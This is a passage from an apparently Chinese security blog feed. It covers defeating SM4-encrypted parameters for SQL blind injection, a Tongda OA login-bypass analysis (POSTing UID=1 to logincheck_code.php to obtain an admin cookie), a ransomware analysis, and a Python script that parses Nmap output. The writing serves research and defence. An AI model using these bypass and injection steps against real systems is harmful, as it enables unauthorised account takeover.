src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>遇到JS加密了如果有实力的大佬可以解密js或者 <a href="https://www.sojson.com/jsobfuscator.html">https://www.sojson.com/jsobfuscator.html</a> 付费解密，不过只是想得到密钥和iv的话，可以在断点进入base64.js后，调试窗口肯定会显示密钥和iv值，因为不管怎么混淆，代码还是要被正常执行的。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>接下来又是注入了，之前用的脚本思路太麻烦了，这次简单点，直接调SM4加密的js，由于这段js已经混淆了，于是从网上找来base64.js的源码简单改了一下，使用python的execjs调用加密。</p></li></ol><p>a. java解开加密内容如图</p><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/12-%E5%AF%B9%E6%AF%94%E6%98%8E%E6%96%87%E5%AF%86%E6%96%87.png" alt="12-对比明文密文"></p><p>b. python调用js加密明文内容，对比结果（调用js的代码如图，上面没有了，因此没有粘过来，感觉内容有点啰嗦了）<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/13-py%E8%B0%83%E7%94%A8js%E5%AE%9E%E7%8E%B0SM4.png" alt="13-py调用js实现SM4"></p><p>6.如此便不用java介入了，之后的操作就是利用之前的盲注脚本，修改一下data参数的加密获取就行了，重复的盲注过程。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><ol><li>实际上现在得web框架中很少这种前端传js的了，但是在很多老企业中还是有部分网站不想重构，这样的例子有很多，第一次开发说出这种修复sql注入的方法时，还很犹豫的回答，还可以注入吧。。。，没想到真的有人这样修复，随着一次一次的治标不治本，自己也在不断探索学习。</li><li>有的时候感觉除非大厂，很多网站如果一抓包看到把参数一起加密了，很有可能是在想隐藏什么漏洞。。。</li><li>还有一个小坑，加密js在JavaScript中需要手动new一个对象，再用py调用对象+方法。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 加密解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意用户登录漏洞分析</title>
      <link href="/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        4月20日，阿里云漏洞预警，通达OA任意用户登录漏洞，链接如下：<a href="https://help.aliyun.com/noticelist/articleid/1060277736.html">https://help.aliyun.com/noticelist/articleid/1060277736.html</a> </p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><p>某盘下载的TDOA11.0.exe</p></li><li><p>文件对比工具（DiffMerge等）</p></li><li><p>zend解密小工具</p></li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre><code>    1. 直接安装TDOA11.0.exe，版本号为11.0.190911       2. 打开“通达应用服务控制中心”启动服务，测试web是否能正常访问      3. 使用OfficeAuto更新程序到11.4.200323 ，备份webroot文件夹      4. 更新到11.4.200417，拷贝webroot</code></pre><p><img src="http://yanxuan.nosdn.127.net/42334a5388839dd91f914689ad693d34.png" alt="1.png"></p><ol start="5"><li>原始的webroot中文件使用zend加密压缩，此处需要使用zend解密工具批量解密为正常的PHP文件</li></ol><p><img src="http://yanxuan.nosdn.127.net/43a30082b59108269b918fc3ee15d664.png" alt="2.png"> </p><h3 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h3><ol><li>对比更新前后的webroot文件</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/3.png" alt="3.png"> </p><ol start="2"><li>如图更新对$UID进行初始化，并判断是否为0</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/4.png" alt="4.png"> </p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/5.png" alt="5.png"> </p><p>由此可见UID是个关键参数，筛选文件对比结果，很清晰判断出更新补丁中哪些文件有相关逻辑。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>​    重点对更新文件进行分析，使用编辑器导入web项目，分析版本11.4的代码逻辑。</p><h5 id="一、Logincheck-code"><a href="#一、Logincheck-code" class="headerlink" title="一、Logincheck_code"></a>一、Logincheck_code</h5><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/6.png" alt="6.png"> </p><p>$UID有POST请求参数获取，访问该URL共需两个参数：UID &amp; CODEUID；</p><p>继续向下分析，中间的判断过程，仅对用户登陆安全登陆限制进行了判断，在如下位置后，直接存入对应UID的SESSION。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/7.png" alt="7.png"> </p><h5 id="二、跟踪判断如何构造CODEUID参数"><a href="#二、跟踪判断如何构造CODEUID参数" class="headerlink" title="二、跟踪判断如何构造CODEUID参数"></a>二、跟踪判断如何构造CODEUID参数</h5><p>​    更新文件中，login_code去掉了一些方法，从内容看出如果login_codeuid为空，访问该php时，会有getUniqid()返回CODEUID。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/8.png" alt="8.png"> </p><h5 id="三、构造Logincheck-code访问，获取登陆cookie"><a href="#三、构造Logincheck-code访问，获取登陆cookie" class="headerlink" title="三、构造Logincheck_code访问，获取登陆cookie"></a>三、构造Logincheck_code访问，获取登陆cookie</h5><ol><li>获取code_uid</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/9.png" alt="9.png"> </p><ol start="2"><li>构造POST请求，获取cookie，默认情况下，UID=1是admin账号，为系统管理员。</li></ol><p> <img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/10.png" alt="10.png"></p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/11.png" alt="11.png"> </p><ol start="3"><li>使用Cookie访问系统</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/12.png" alt="12.png"> </p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li><p>未更新补丁前，备份logincheck_code.php，将该文件移除webroot目录；或使用WAF等安全产品，禁止logincheck_code.php访问</p></li><li><p>更新官方补丁</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>需要验证历史版本的从11.0更新时，可以逐步版本更新，备份webroot文件夹，验证对应版本是，更换webroot即可</p></li><li><p>第一次尝试对比补丁去验证漏洞，对于更新点比较少的应用，可以很快定位</p></li><li><p>登陆验证类功能点，只做状态判断，尽量不要附带其他功能</p></li></ol><p>Ps: 文章审核了快3个月。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码分析 </tag>
            
            <tag> 漏洞预警 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次分析勒索病毒</title>
      <link href="/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
      <url>/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h5><p>​        接到客户通知，有个PC中了勒索病毒，领导让尽量分析一下给客户个回复，着急的我赶紧翻书翻教程，一顿qwer，最终还是没能将文件恢复，但是分析过程中又学习了一些知识，借此分享。</p><p>先附下加密后的截图</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%AD%E7%97%85%E6%AF%92%E5%90%8E.png" alt="中病毒后"></p><h3 id="0x02-样本信息"><a href="#0x02-样本信息" class="headerlink" title="0x02 样本信息"></a>0x02 样本信息</h3><ul><li><p>程序名： 7407.tmp.exe</p></li><li><p>样本大小：445952</p></li><li><p>MD5：b65014814bbbd09367df4a86c0d4204d</p></li><li><p>加壳混淆：UPX 0.89 - 3.x</p></li><li><p>在线检测</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%9C%A8%E7%BA%BFAV%E6%A3%80%E6%B5%8B.png" alt="在线AV检测"></p></li><li><p>分析工具：OD、X32dbg、IDA、火绒剑、微步在线</p></li></ul><h3 id="0x03-监控运行分析程序行为"><a href="#0x03-监控运行分析程序行为" class="headerlink" title="0x03 监控运行分析程序行为"></a>0x03 监控运行分析程序行为</h3><ol><li>自身复制</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%87%AA%E8%BA%AB%E5%88%9B%E5%BB%BA.png" alt="自身创建"></p><ol><li>修改注册表</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8.png" alt="修改注册表"></p><ol><li>监控单个文件的操作流程</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E6%B5%81%E7%A8%8B.png" alt="一个文件的流程"></p><ol><li>netstat监控无网络行为</li><li>import导入函数中无加密函数，怀疑没有使用公用的加密算法进行加密</li></ol><h3 id="0x04-脱壳后OD分析-进入误区"><a href="#0x04-脱壳后OD分析-进入误区" class="headerlink" title="0x04 脱壳后OD分析-进入误区"></a>0x04 脱壳后OD分析-进入误区</h3><ol><li>由于是UPX加壳，直接用脱壳工具就掉了</li><li>GetTempFileNameA获取tmp目录</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/GetTempFileNameA.png" alt="GetTempFileNameA"></p><ol><li>getTempFile</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/getFileTempName.png" alt="getFileTempName"></p><ol><li>打印机的相关操作（不知道有什么用，反正是进入误区了）</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E6%89%93%E5%8D%B0%E6%9C%BA%E5%90%8D%E7%A7%B0.png" alt="设置默认打印机名称"></p><p> 到此，程序运行退出，文件也没加密，这就肯定有反调试了，但是OD有插件啊，怀疑程序对INT 3断点有反调检测，直接把所有断线都取消了重新设置一下：<strong>进入call后，在第二行下断点</strong></p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/INT3%E6%A3%80%E6%B5%8B.png" alt="INT3检测"></p><p> 此时发现程序还是会自动退出，同时文件也开始被加密了，查看进程列表和火绒剑，发现又多了一个7407.tmp.exe进程，调用位置也和调试的病毒程序一样。于是重新在 <strong>CreateProcessW</strong>下断点，刚开始病毒程序有其他反调检测，程序发现被调试时会重新起一个进程，后来通过火绒剑发现无调试时也有创建进程操作；</p><p> 接着尝试在 <strong>WriteMemory</strong>下断点，这下找到了真实的病毒执行体</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/WriteProcess%E5%86%99%E8%BF%9B%E7%A8%8B.png" alt="WriteProcess写进程"></p><ol><li>dump真实病毒程序 PE头文件，找到OEP</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E7%9C%9F%E5%AE%9E%E7%97%85%E6%AF%92OEP.png" alt="真实病毒OEP"></p><p> 下一步在主程序使用ResumeThread恢复新进程前，使用X32DBG附加新进程；可以在ResumeThread处下断点，再附加新进程。</p><h3 id="0x05-X32dbg分析-真实病毒文件"><a href="#0x05-X32dbg分析-真实病毒文件" class="headerlink" title="0x05 X32dbg分析-真实病毒文件"></a>0x05 X32dbg分析-真实病毒文件</h3><ol><li>删除卷影副本</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png" alt="执行命令"></p><ol><li><p>在 WriteFile、CreateFileW、ReadFile、DeleteFileW、GetWindowsDirectoryA处下断点，运行程序，断下来后，回溯进入程序领空</p><p>此时找到sub_402880为病毒进程加密一个的整个操作</p></li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E4%B8%BB%E8%A6%81CALL.png" alt="勒索病毒主要CALL"></p><ol><li>往下翻，找到主要的加密（计算）依据 （key） sub_4034C0</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E4%BE%9D%E6%8D%AEkey.png" alt="加密依据key"></p><ol><li>找到加密CALL，这里确定是加密CALL的原因是，执行这个CALL后，发现之前读取到文件内容的Buffer区域中，被写入了新的数据，且该数据和文件被加密后的16进制内容相同。</li></ol><p>a. 读取到的文件内容</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="读取文件的数据"></p><p>b. 执行了sub_403960后数据变化</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E5%90%8E.png" alt="加密后">c. WinHex查看加密后文件</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/tass_liehuHEX%E6%9F%A5%E7%9C%8B.png" alt="tass_liehuHEX查看"></p><ol><li>根据sub_403960执行前压栈信息，发现有一个重要的计算依据，可以叫做加密key，由 第三步sub_4034C0得到</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8F%82%E6%95%B0.png" alt="参数"></p><ol><li>尝试分析加密参数生成、文件内容加密的计算方法 – 没成功，有些复杂</li></ol><p>a. key 值计算CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/key%E5%80%BC%E8%AE%A1%E7%AE%97.png" alt="key值计算"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/IDA-key%E8%AE%A1%E7%AE%97call.png" alt="IDA-key计算call"></p><p>b. 加密CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86CALL%E5%86%85%E9%83%A8.png" alt="加密CALL内部"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" alt="加密文件内容"></p><p> 到此，发现key值也有一个动态的计算依据，这个需要重新回溯，而且计算过程比较麻烦，所以结束了。</p><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><ol><li><p>写注册表操作</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\7407.tmp.exe</p></li><li><p>自身复制</p><p>C:\Windows\System32\7407.tmp.exe<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe</p></li><li><p>病毒不会蠕虫传播、无明显的网络行为</p></li><li><p>没有加密操作，只是自定义了一些函数，对文件内容读取、运算，写入新文件，删除源文件</p></li><li><p>目前测试火绒杀毒不能识别病毒文件</p></li></ol><p> 分析到这，通知用户在中毒机器上 杀掉所有 7407.tmp.exe进程，删除对应注册表、自身复制的文件，使用磁盘恢复工具尝试一下能不能恢复文件。</p><h3 id="0x07-分析过程中的一些小知识点"><a href="#0x07-分析过程中的一些小知识点" class="headerlink" title="0x07 分析过程中的一些小知识点"></a>0x07 分析过程中的一些小知识点</h3><ol><li>调试时发现反调插件已经有了，还是一调试就退出，先尝试把异常忽略关闭，看看是否可行；同时考虑程序检测导入函数是否被下断点（原因是OD在设置CC断点时，会将对应位置的机器码修改为 CC01，反调试程序会检测这个位置），这时可以尝试在CALL内第二行设置断点</li><li>对于自身启动新进程，通过内存将真实文件内容写入的方式，可以通过火绒剑一步一步监控，再找对应的API函数，下断点调试</li><li>OD中找到一个函数，想要在IDA中找到对应位置，因为IDA有伪代码，一般情况，直接跳转地址，发现找不到，此时，使用 函数地址 - OD中基址 + IDA基址 ，再使用G跳转，也可以找到特征字符，在IDA中使用 alt + b搜索位置</li></ol>]]></content>
      
      
      <categories>
          
          <category> 勒索病毒 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒分析 </tag>
            
            <tag> 逆向学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap结果过滤脚本</title>
      <link href="/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/"/>
      <url>/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一个简单的python脚本，将nmap输出的xml格式提取为excel</p></blockquote><h3 id="一、Nmap扫描"><a href="#一、Nmap扫描" class="headerlink" title="一、Nmap扫描"></a>一、Nmap扫描</h3><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/1.png" alt="精准打击"></p><p>  在信息收集阶段，一个重要的环节就是端口扫描，如果是一两个目标直接干就完了；但是如果是一堆IP地址段怎么办，这时扫描结果呼啦一大片，随便挑几个深入，这样显得不够专业吧</p><hr><p><strong>nmap的几个命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n</span><br><span class="line">2. nmap -sV 192.168.1.1 -T4 --open -p 22,80,3389 -n -O</span><br></pre></td></tr></table></figure><blockquote><p>注明：nmap的参数有很多，不列举了，sS 使用SYN的快速扫描（速度快），sV 探测端口服务，-O 探测目标操作系统</p></blockquote><h3 id="二、结果输出"><a href="#二、结果输出" class="headerlink" title="二、结果输出"></a>二、结果输出</h3><p>  添加-oX参数指定输出为xml格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n -oX test.xml</span><br></pre></td></tr></table></figure><h3 id="三、xml结果过滤"><a href="#三、xml结果过滤" class="headerlink" title="三、xml结果过滤"></a>三、xml结果过滤</h3><h5 id="1-关于xml文件解析"><a href="#1-关于xml文件解析" class="headerlink" title="1. 关于xml文件解析"></a>1. 关于xml文件解析</h5><p>  python中解析xml有四种方法，其实对于我们这些偶尔拿来吃鸡的来说，随便一个就行了<br>常用的xml.dom.minidom和xml.etree.ElementTree，其中xml.etree.ElementTree有一个C语言的实现，即xml.etree.cElementTree，听说速度会快一点。（python3.3+版本后，ElemenTree模块会自动优先使用C加速器，如果不存在C实现，则会使用Python实现）</p><h5 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET   <span class="comment">#解析xml，python3已经默认使用cElementTree</span></span><br><span class="line"><span class="keyword">import</span> xlwt     <span class="comment">#写excel</span></span><br><span class="line"><span class="keyword">import</span> argparse    <span class="comment">#运行前参数</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断运行时python版本是否小于3.x</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info.major &lt; <span class="number">3</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I need python3.x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsexml</span>(<span class="params">xml,sheet</span>):</span></span><br><span class="line">tree = ET.parse(xml)</span><br><span class="line">root = tree.getroot()     <span class="comment">#获取根节点</span></span><br><span class="line">hosts = root.findall(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">i = <span class="number">0</span>   <span class="comment">#写入excel的计数器</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">portTcpRes = <span class="string">&quot;&quot;</span></span><br><span class="line">portOtherRes = <span class="string">&quot;&quot;</span></span><br><span class="line">ip = host.find(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">ipaddress = ip.attrib.get(<span class="string">&#x27;addr&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;ip地址:&quot;+ ipaddress)</span></span><br><span class="line">ports = host.find(<span class="string">&quot;ports&quot;</span>).findall(<span class="string">&quot;port&quot;</span>)</span><br><span class="line"><span class="comment">#获取系统版本的扫描结果</span></span><br><span class="line">os = host.find(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">osmatch = os.find(<span class="string">&quot;osmatch&quot;</span>)</span><br><span class="line">osname = osmatch.attrib.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">accuracy = osmatch.attrib.get(<span class="string">&quot;accuracy&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">osname = <span class="string">&quot;&quot;</span></span><br><span class="line">accuracy = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># print(ports)</span></span><br><span class="line"><span class="keyword">for</span> portT <span class="keyword">in</span> <span class="built_in">list</span>(ports):</span><br><span class="line">service = portT.find(<span class="string">&quot;service&quot;</span>)</span><br><span class="line">protocol = portT.attrib.get(<span class="string">&#x27;protocol&#x27;</span>)</span><br><span class="line"><span class="comment">#获取nmap结果中service信息</span></span><br><span class="line">serviceName = service.attrib.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">product = service.attrib.get(<span class="string">&#x27;product&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> product:</span><br><span class="line">serviceName = serviceName + <span class="string">&#x27;:&#x27;</span> + product   <span class="comment">#将SERVICE和VERSION组合一起</span></span><br><span class="line"><span class="comment">#获取端口号</span></span><br><span class="line">portNum = portT.attrib.get(<span class="string">&#x27;portid&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> protocol == <span class="string">&#x27;tcp&#x27;</span>:</span><br><span class="line">portTcpRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#其他协议</span></span><br><span class="line">portOtherRes += portNum + <span class="string">&#x27;(&#x27;</span> + serviceName + <span class="string">&#x27;),&#x27;</span></span><br><span class="line">output(sheet,ipaddress,portTcpRes.strip(<span class="string">&#x27;,&#x27;</span>),portOtherRes.strip(<span class="string">&#x27;,&#x27;</span>),i,osname,accuracy+<span class="string">&quot;%&quot;</span>)    <span class="comment">#写入excel</span></span><br><span class="line"><span class="comment"># print(portTcpRes.strip(&#x27;,&#x27;))</span></span><br><span class="line"><span class="comment"># print(&#x27;------------------------&#x27;)</span></span><br><span class="line"><span 